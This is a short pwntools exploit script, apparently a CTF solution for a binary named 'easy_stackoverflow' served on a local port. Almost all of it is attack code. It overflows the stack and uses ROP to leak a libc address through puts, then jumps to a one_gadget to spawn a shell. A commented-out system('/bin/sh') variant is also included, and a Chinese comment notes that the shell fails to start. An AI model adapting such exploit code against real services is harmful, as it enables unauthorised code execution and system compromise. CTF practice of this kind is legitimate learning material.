#coding:utf-8
from pwn import *
context.log_level = 'debug'
elf = ELF('./easy_stackoverflow')
libc = elf.libc
# p = process('./easy_stackoverflow')
p = remote('127.0.0.1',10001)

# gdb.attach(p,'b*0x4007a3')

pop_rdi_ret = 0x04007a3
puts = 0x4006D4
main = 0x4006F2
bss = 0x601089+0x800

#----- leak libc base
payload = p64(elf.got['__libc_start_main']) + p64(puts)
p.sendafter('leave some message??\n',payload)

payload = 'a'*0x10 + p64(bss) + p64(pop_rdi_ret)
p.sendafter('vulnerable? so what?? come to pwn me!!\n',payload)

libc_start_main = u64(p.recv(6).ljust(8,'\x00'))
libc_database = libc_start_main - libc.sym['__libc_start_main']
log.info('libc_database is '+hex(libc_database))
system = libc_database + libc.sym['system']
onegadget = libc_database + 0x4526a

#----- exploit 

payload = p64(0)*3 + p64(onegadget)
p.send(payload)

# payload = p64(bss-5*8) + p64(system)
# p.sendafter('leave some message??\n',payload)

# payload = '/bin/sh\x00' + p64(0)*2 + p64(pop_rdi_ret)
# p.sendafter('vulnerable? so what?? come to pwn me!!\n',payload)  

#明明GDB里跳到似乎system执行完没啥错误，但shell就是起不起来。  似乎是system执行到execve()参数有点问题？？

p.interactive()